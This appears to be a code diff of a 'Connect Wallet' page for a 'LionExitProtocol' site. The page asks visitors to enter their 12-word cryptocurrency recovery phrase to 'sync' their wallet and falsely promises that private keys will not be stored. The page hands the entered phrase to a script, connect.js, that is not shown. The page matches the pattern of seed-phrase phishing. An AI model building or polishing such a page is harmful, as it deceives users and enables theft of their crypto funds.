@@ -1,27 +1,23 @@
-<!DOCTYPE html><link rel="stylesheet" href="style.css">
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Connect Wallet | LionExitProtocol</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connect Wallet – LionExitProtocol</title>
+  <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
-  <h2>Connect Your Wallet</h2>
-  <p>Enter your 12-word recovery phrase to sync with QFS. <br><strong>Your private keys will not be stored.</strong></p>
+  <div class="container">
+    <h1>🔐 Sync Wallet</h1>
+    <p>Enter your 12 recovery words to sync your wallet. <br><strong>Your private keys will NOT be stored.</strong></p>
 
-  <form>
-    <textarea placeholder="Enter your 12 recovery words here..." rows="4" cols="50" required></textarea><br>
-    <button type="submit">Sync Wallet</button>
-  </form>
+    <textarea id="mnemonic" placeholder="Enter your 12-word recovery phrase..."></textarea>
 
-  <p><a href="index.html">← Back to Home</a></p>
+    <button id="connectBtn">Sync Wallet</button>
+
+    <div id="result" class="hidden"></div>
+  </div>
+
+  <script src="connect.js"></script>
 </body>
-</html><script src="connect.js"></script>
-<!-- connect.html -->
-<form id="syncForm">
-  <label for="phrase">Enter your 12-word recovery phrase:</label>
-  <textarea id="phrase" rows="4" placeholder="word1 word2 word3 ..."></textarea>
-  <button type="submit">Sync Wallet</button>
-</form>
-
-<div id="result" style="margin-top: 20px; color: green; font-weight: bold;"></div>
+</html>
